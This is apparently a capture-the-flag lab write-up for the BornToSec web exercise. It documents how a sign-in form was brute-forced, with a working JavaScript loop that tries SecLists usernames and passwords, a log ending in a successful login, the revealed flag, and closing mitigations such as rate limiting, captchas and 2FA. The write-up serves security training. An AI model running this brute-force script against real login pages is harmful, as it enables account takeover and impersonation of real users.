# Sign in form Bruteforce

## How we found the breach

On the page `http://IP/?page=signin` we can find the sign in form, it takes a username and a password.

After hacking into the server database we found several user's usernames in database.

To see how we've scanned the data please look at:

[SQL injection on members table explanations →](../../sql_injection_members_table/Ressources/Explanations.md)

```js
// Only surname
"me", "GetThe",
// Surname + First name
"GetTheFlag", "meone", "metwo", "methree",
```

Also after scanning the whole database we did not found any password columns in any tables.

This is why we went for the bruteforce option, even more when there's not visible protection about it after several attempts.

### The Bruteforce script

We will use the following password and usernames dataset for the form inputs value:

- [usernames →](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)
- [passwords →](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top1000.txt)

We will then hit the endpoint below with all the possibilites until the server returns an authenticated page.

```js
`http://IP/?page=signin&username=${username}&password=${password}&Login=Login#`
```

#### The main logic

```js
  await Promise.all(usernameCollection.map(async username => {
        for (const password of passwordCollection) {
            try {
                const endpointToHit = getEndpoint({ username, password });
                const response = await fetch(endpointToHit);
                const renderedPage = await response.text()
                const attemptFailed = renderedPage.includes(BAD_AUTH_ERROR_IMAGE)

                // In case of wrong authentication atttemp the following image is rendered by the server
                // The Status code stays 200
                // <img src="images/WrongAnswer.gif" alt=""> 
                if (attemptFailed) {
                    console.log(`FAILURE for pair: username=${username} password=${password}`)
                    continue
                } else {
                    console.log(`SUCCESS for pair: username=${username} password=${password}`)
                    console.log({ renderedPage })
                    console.log('_'.repeat(10))
                    break;
                }

            } catch (e) {
                console.log(`Unkown error on attempt for username=${username} password=${password}`)
                continue
            }
        }
    }))
```

After running the script, it leads to a successful attempt for all the concurent users on the 95th password: `shadow`.
Indeed the username is not mandatory, filling the password input with `shadow` is enough the retrieve the flag from the server.

#### Log snippet

```zsh
# ...
FAILURE for pair: username=wil password=696969
FAILURE for pair: username=admin password=letmein
FAILURE for pair: username=metwo password=696969
FAILURE for pair: username=methree password=696969
FAILURE for pair: username=meone password=696969
FAILURE for pair: username=GetThe password=696969
FAILURE for pair: username=GetTheFlag password=696969
SUCCESS for pair: username=wil password=shadow
{
  renderedPage: '<!DOCTYPE HTML>\n' +
    '<html>\n' +
    '\t<head>\n' +
    '\t\t<title>BornToSec - Web Section</title>\n' +
    '\t\t<meta http-equiv="content-type" content="text/html; charset=utf-8" />\n' +
    '\t\t<meta name="description" content="" />\n' +
    '\t\t<meta name="keywords" content="" />\n' +
    '\t\t<!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->\n' +
    '\t\t<script src="js/jquery.min.js"></script>\n' +
    '\t\t<script src="js/skel.min.js"></script>\n' +
    '\t\t<script src="js/skel-layers.min.js"></script>\n' +
    '\t\t<script src="js/init.js"></script>\n' +
    '\t\t<noscript>\n' +
    '\t\t\t<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />\n' +
    '\t\t\t<link rel="icon" type="image/x-icon" href="favicon.ico" />\n' +
    '\t\t\t<link rel="stylesheet" href="css/skel.css" />\n' +
    '\t\t\t<link rel="stylesheet" href="css/style.css" />\n' +
    '\t\t\t<link rel="stylesheet" href="css/style-xlarge.css" />\n' +
    '\t\t</noscript>\n' +
    '\t</head>\n' +
    '\t<body class="landing">\n' +
    '\t\t<!-- Header -->\n' +
    '\t\t<header id="header" >\n' +
    '\t\t\t\t\t\t\t\t<a href=http://192.168.56.101><img src=http://192.168.56.101/images/42.jpeg height=82px width=82px/></a>\n' +
    '\t\t\t\t\t\t\t\t<nav id="nav">\n' +
    '\t\t\t\t\t<ul>\n' +
    '\t\t\t\t\t\t<li><a href="index.php">Home</a></li>\n' +
    '\t\t\t\t\t\t<li><a href="?page=survey">Survey</a></li>\n' +
    '\t\t\t\t\t\t<li><a href="?page=member">Members</a></li>\n' +
    '\t\t\t\t\t</ul>\n' +
    '\t\t\t\t</nav>\n' +
    '\t\t\t</header>\n' +
    '\n' +
    '\t\t<!-- Main -->\n' +
    '\t\t\t<section id="main" class="wrapper">\n' +
    '\t\t\t\t<div class="container" style="margin-top:75px">\n' +
    '<center><h2 style="margin-top:50px;">The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>\t\t\t\t</div>\n' +
    '\t\t\t</section>\n' +
    '\t\t<!-- Footer -->\n' +
    '\t\t\t<footer id="footer">\n' +
    '\t\t\t\t<div class="container">\n' +
    '\t\t\t\t\t<ul class="icons">\n' +
    '\t\t\t\t\t\t<li><a href="index.php?page=redirect&site=facebook" class="icon fa-facebook"></a></li>\n' +
    '\t\t\t\t\t\t<li><a href="index.php?page=redirect&site=twitter" class="icon fa-twitter"></a></li>\n' +
    '\t\t\t\t\t\t<li><a href="index.php?page=redirect&site=instagram" class="icon fa-instagram"></a></li>\n' +
    '\t\t\t\t\t</ul>\n' +
    '\t\t\t\t\t<ul class="copyright">\n' +
    '\t\t\t\t\t\t<a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"><li>&copy; BornToSec</li></a>\n' +
    '\t\t\t\t\t</ul>\n' +
    '\t\t\t\t</div>\n' +
    '\t\t\t</footer>\n' +
    '\t</body>\n' +
    '</html>\n' +
    '\n'
}
__________
# ...
```

## How to exploit the breach

From there we could perform any operation we want inside the application, authenticated as the hacked user.

For example for mailBox account we could send emails impersonating the hacked user.

And overall we could even change the user's password depending on the application security rigor.

## How to avoid the breach

Several solution or good practices exist, such as limiting the amount of request from the same IP or adding a recaptcha usage on the form.

[2FA](https://en.wikipedia.org/wiki/Multi-factor_authentication) authentication such a google Authenticator, requesting the user to validate it's identity on one of his other devices.
